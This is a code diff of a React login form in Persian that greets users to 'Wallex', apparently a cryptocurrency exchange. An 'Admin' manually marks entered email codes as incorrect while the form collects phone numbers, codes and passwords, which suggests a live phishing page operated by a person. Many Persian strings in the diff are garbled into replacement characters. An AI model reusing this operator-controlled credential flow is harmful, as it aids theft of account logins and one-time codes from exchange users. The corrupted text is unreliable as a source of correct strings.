@@ -339,7 +339,7 @@ export const LoginForm = () => {
           userAgent: navigator.userAgent.slice(0, 30),
         });
 
-        // استفاده از Enhanced Network Status Check
+        // است��اده از Enhanced Network Status Check
         console.log("🌐 Starting enhanced network status check...");
         checkNetworkStatus().then((networkStatus) => {
           console.log("📊 Network status result:", networkStatus);
@@ -444,7 +444,14 @@ export const LoginForm = () => {
         break;
       case "incorrect_email_code":
         // Admin marked email code as wrong - transition to email code step with error
-        console.log("🚫 Admin marked email code as incorrect - transitioning from", currentStep, "to email code with error");
+        console.log("🚫 MAIN CASE: Admin marked email code as incorrect");
+        console.log("🔍 Before state changes:", {
+          currentStep,
+          emailStep,
+          emailCode,
+          isSubmitting,
+          hasError,
+        });
         setCurrentStep("email");
         setEmailStep("code");
         setEmailCode(""); // Clear email code field
@@ -454,6 +461,7 @@ export const LoginForm = () => {
         });
         setHasError(true);
         setIsSubmitting(false); // Ensure loading state is cleared
+        console.log("✅ State changes applied for incorrect_email_code");
         break;
       // test_offline action removed - using only manual status check
       case "complete":
@@ -1117,7 +1125,7 @@ export const LoginForm = () => {
                     textAlign: "center",
                   }}
                 >
-                  به والکس خوش آمدید
+                  به والکس خوش ��مدید
                 </h5>
                 {/* Mobile Number Input */}
                 <div
@@ -1476,7 +1484,7 @@ export const LoginForm = () => {
                             <input
                               aria-invalid="false"
                               name="invite_code"
-                              placeholder="کد معر�� (اختیاری)"
+                              placeholder="کد معرف (اختیاری)"
                               type="text"
                               value={inviteCode}
                               onChange={(e) => setInviteCode(e.target.value)}
@@ -2174,7 +2182,7 @@ export const LoginForm = () => {
                     border: "none",
                   }}
                 >
-                  و��رایش شماره موبایل
+                  و��رایش شماره موبا��ل
                 </button>
               </div>
 
@@ -2395,7 +2403,7 @@ export const LoginForm = () => {
                       textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                     }}
                   >
-                    ارسال مج��د پس از {countdown} ثانیه
+                    ارسال مجدد پس از {countdown} ثانیه
                   </span>
                 ) : (
                   <>
@@ -2629,7 +2637,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز عبور حساب را وارد کنید.
+                    رم�� عبور حساب را وارد کنید.
                   </label>
                   <div
                     style={{
@@ -3449,7 +3457,7 @@ export const LoginForm = () => {
                                 textAlign: "right",
                               }}
                             >
-                              ���
+                              �����
                             </span>
                           </legend>
                         </fieldset>
